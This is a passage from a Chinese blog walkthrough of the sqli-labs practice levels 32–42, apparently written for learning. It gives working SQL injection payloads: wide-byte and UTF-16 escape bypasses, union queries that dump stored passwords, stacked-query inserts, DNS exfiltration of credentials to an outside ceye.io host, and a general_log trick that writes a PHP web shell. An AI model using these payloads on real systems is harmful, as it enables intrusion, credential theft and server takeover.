<p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<ol>
<li>将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</li>
</ol>
<p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p>
<p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<table>
<thead>
<tr>
<th>预定义字符</th>
<th style="text-align:left">转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td style="text-align:left"><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td style="text-align:left"><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td style="text-align:left"><code>\&quot;</code></td>
</tr>
</tbody>
</table>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p>
<blockquote>
<p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
</blockquote>
<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&#39;$uname&#39;</code></td>
</tr>
</tbody>
</table>
<p>过滤方法依然和 Less-33 一致：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br></pre></td></tr></table></figure>
<p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=233</span><br></pre></td></tr></table></figure>
<p>MySQL 注入天书这里介绍了一个新的方法</p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p>
<p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">'|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��'</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">'|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��'</span></span><br></pre></td></tr></table></figure>
<p>首先尝试一个经典的万能密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; or 1#&amp;passwd=</span><br></pre></td></tr></table></figure>
<p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'�'</span> <span class="keyword">or</span> <span class="number">1</span><span class="comment">#and password='$passwd' LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
<p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># where username = 'x' or 1</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'x'</span> or 1;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">|  1 | Dumb          | Dumb       |</span><br><span class="line">|  2 | Angelina      | I-kill-you |</span><br><span class="line">|  3 | Dummy         | p@ssword   |</span><br><span class="line">|  4 | secure        | crappy     |</span><br><span class="line">|  5 | stupid        | stupidity  |</span><br><span class="line">|  6 | superman      | genious    |</span><br><span class="line">|  7 | batman        | mob!le     |</span><br><span class="line">|  8 | admin         | 233        |</span><br><span class="line">|  9 | admin1        | admin1     |</span><br><span class="line">| 10 | admin2        | admin2     |</span><br><span class="line">| 11 | admin3        | admin3     |</span><br><span class="line">| 12 | dhakkan       | dumbo      |</span><br><span class="line">| 14 | admin4        | admin4     |</span><br><span class="line">| 21 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">14 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># where username = '</span>x<span class="string">' or 0</span></span><br><span class="line"><span class="string">mysql&gt; select * from users where username = '</span>x<span class="string">' or 0;</span></span><br><span class="line"><span class="string">Empty set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># where 1</span></span><br><span class="line"><span class="string">mysql&gt; select * from users where 1;</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">| id | username      | password   |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">|  1 | Dumb          | Dumb       |</span></span><br><span class="line"><span class="string">|  2 | Angelina      | I-kill-you |</span></span><br><span class="line"><span class="string">|  3 | Dummy         | p@ssword   |</span></span><br><span class="line"><span class="string">|  4 | secure        | crappy     |</span></span><br><span class="line"><span class="string">|  5 | stupid        | stupidity  |</span></span><br><span class="line"><span class="string">|  6 | superman      | genious    |</span></span><br><span class="line"><span class="string">|  7 | batman        | mob!le     |</span></span><br><span class="line"><span class="string">|  8 | admin         | 233        |</span></span><br><span class="line"><span class="string">|  9 | admin1        | admin1     |</span></span><br><span class="line"><span class="string">| 10 | admin2        | admin2     |</span></span><br><span class="line"><span class="string">| 11 | admin3        | admin3     |</span></span><br><span class="line"><span class="string">| 12 | dhakkan       | dumbo      |</span></span><br><span class="line"><span class="string">| 14 | admin4        | admin4     |</span></span><br><span class="line"><span class="string">| 21 | admin'</span><span class="comment">#hacker | 111        |</span></span><br><span class="line">+----+---------------+------------+</span><br><span class="line">14 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where 0</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> 0;</span><br><span class="line">Empty <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>那么直接尝试一下最基本的联合查询注入看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure>
<p>也是 OK 的</p>
<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是本关的拼接方式是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="variable">$id</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br></pre></td></tr></table></figure>
<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>主要防护代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id=check_quotes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p>
<table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody>
</table>
<p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1�&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br></pre></td></tr></table></figure>
<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&#39;$uname&#39;</code></td>
</tr>
</tbody>
</table>
<p>依然使用了 和 Less-36 的防护方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure>
<p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure>
<h2 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id = 1;select version();</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p>
<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ol>
<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li>
<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li>
</ol>
<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
<h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure>
<p><strong>SQL Server</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure>
<p><strong>Postgresql</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_test;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>注入天书里面说 Oracle 不支持堆叠查询，这个国光我对 Oracle 不熟悉，以后接触到了国光再亲自尝试看看。</p>
<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>又到了简单源码分析的时间了，来看看堆叠注入的代码是如何实现的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 参数直接带入到 SQL 语句中</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error($con1));</span><br></pre></td></tr></table></figure>
<p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>变成了现在的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
<p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p>
<p><strong>添加字段值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;insert into users(username,password) values (&apos;hello&apos;,&apos;world&apos;);</span><br></pre></td></tr></table></figure>
<p>数据库中查看是否添加成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'hello'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| 23 | hello    | world    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
<p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来国光演示我认为比较实用的姿势。</p>
<h4 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h4><p>需要条件：</p>
<ol>
<li>MySQL 开启 load_file()</li>
<li>DNSLog 平台 （<a href="http://hyuga.co/" target="_blank" rel="noopener">Hyuga</a>、<a href="http://ceye.io/" target="_blank" rel="noopener">CEYE</a>）</li>
<li>Windows 平台</li>
</ol>
<p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p>
<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.31.53\test\</span><br></pre></td></tr></table></figure>
<p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p>
<p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p>
<p>下面国光临时使用 Windows 下的 PHPStudy 来搭建 sqli-labs 测试环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;select load_file(concat(&apos;\\\\&apos;,(select hex(concat_ws(&apos;~&apos;,username,password)) from users limit 0,1),&apos;.gvc791.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>
<p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p>
<p><img src="http://qiniuyun.lintstar.top/15897015756622.png" alt="15897015756622"><br>手动 Hex 解码即可</p>
<h4 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h4><p>需要条件：</p>
<ol>
<li>Web 的物理路径</li>
<li>MySQL 可以读写 Web 目录</li>
<li>Windows 成功率 高于 Linux</li>
</ol>
<p>首先查看当前的日志的相关配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/bb198f1a9cc6.log |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>
<p>Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;set global general_log = &quot;ON&quot;;set global general_log_file=&apos;/var/www/html/shell.php&apos;;--+</span><br></pre></td></tr></table></figure>
<p>然后 MySQL 再查看日志配置是否被修改了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+-------------------------+</span><br><span class="line">| Variable_name    | Value                   |</span><br><span class="line">+------------------+-------------------------+</span><br><span class="line">| general_log      | ON                      |</span><br><span class="line">| general_log_file | /var/www/html/shell.php |</span><br><span class="line">+------------------+-------------------------+</span><br></pre></td></tr></table></figure>
<p>这个尝试 getshell：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1';select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p>
<p>查看一下当的日志文件：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/shell.php</span><br><span class="line">200517  8:47:04       10 Connect    root@localhost on security</span><br><span class="line">           10 Init DB    security</span><br><span class="line">           10 Query    <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span><span class="comment">-- ' LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
<p>此时已经成功写入了，但是因为这个文件属于 mysql 用户组的，国光我测试并没有成功执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l  /var/www/html/shell.php</span><br><span class="line">-rw-rw---- 1 mysql mysql 171 May 17 08:47 /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
<p>不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，如果有师傅补充的话 欢迎评论区留言！</p>
<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p>
<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-38 相比只是拼接方式不一样。</p>
<p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p>
<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注、堆叠注入</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，国光这里不再赘述。</p>
<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>username=&#39;$username&#39;</code></td>
</tr>
</tbody>
</table>
<ul>
<li><code>index.php</code></li>
</ul>
<p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p>
<ul>
<li><code>forgot_password.php</code></li>
</ul>
<p>if you forgot your password,go to hack it</p>
<ul>
<li><code>acc-create.php</code></li>
</ul>
<p>if you need to create account,then hack your way in</p>
<ul>
<li><code>failed.php</code></li>
</ul>
<p>Bug off you silly dump hacker</p>
<ul>
<li><code>login.php</code></li>
</ul>
